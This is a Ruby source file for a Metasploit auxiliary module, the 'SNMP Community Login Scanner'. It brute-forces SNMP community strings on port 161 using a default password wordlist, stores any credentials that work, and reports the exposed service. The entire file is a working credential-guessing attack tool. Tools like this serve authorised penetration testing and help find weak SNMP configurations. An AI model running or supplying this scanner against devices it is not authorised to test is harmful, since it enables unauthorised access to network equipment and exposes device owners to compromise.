##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/community_string_collection'
require 'metasploit/framework/login_scanner/snmp'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::AuthBrute

  def initialize
    super(
      'Name'        => 'SNMP Community Login Scanner',
      'Description' => %q{
        This module logs in to SNMP devices using common community names.
      },
      'Author'      => 'hdm',
      'References'     =>
        [
          [ 'CVE', '1999-0508'] # Weak password
        ],
      'License'     => MSF_LICENSE
    )

    register_options(
    [
      Opt::RPORT(161),
      OptEnum.new('VERSION', [true, 'The SNMP version to scan', '1', ['1', '2c', 'all']]),
      OptString.new('PASSWORD', [ false, 'The password to test' ]),
      OptPath.new('PASS_FILE',  [ false, "File containing communities, one per line",
        File.join(Msf::Config.data_directory, "wordlists", "snmp_default_pass.txt")
      ])
    ])

    deregister_options('USERNAME', 'USER_FILE', 'USERPASS_FILE')
  end

  # Operate on a single host so that we can take advantage of multithreading
  def run_host(ip)

    collection = Metasploit::Framework::CommunityStringCollection.new(
        pass_file: datastore['PASS_FILE'],
        password: datastore['PASSWORD']
    )

    scanner = Metasploit::Framework::LoginScanner::SNMP.new(
        host: ip,
        port: rport,
        cred_details: collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        version: datastore['VERSION'],
        framework: framework,
        framework_module: self,
        queue_size: 100
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
          module_fullname: self.fullname,
          workspace_id: myworkspace_id
      )
      if result.success?
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)

        print_good "#{ip}:#{rport} - Login Successful: #{result.credential} (Access level: #{result.access_level}); Proof (sysDescr.0): #{result.proof}"
        report_service(
          :host  => ip,
          :port  => rport,
          :proto => 'udp',
          :name  => 'snmp',
          :info  => result.proof,
          :state => 'open'
        )
      else
        invalidate_login(credential_data)
        print_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status})"
      end
    end
  end

  def rport
    datastore['RPORT']
  end




end
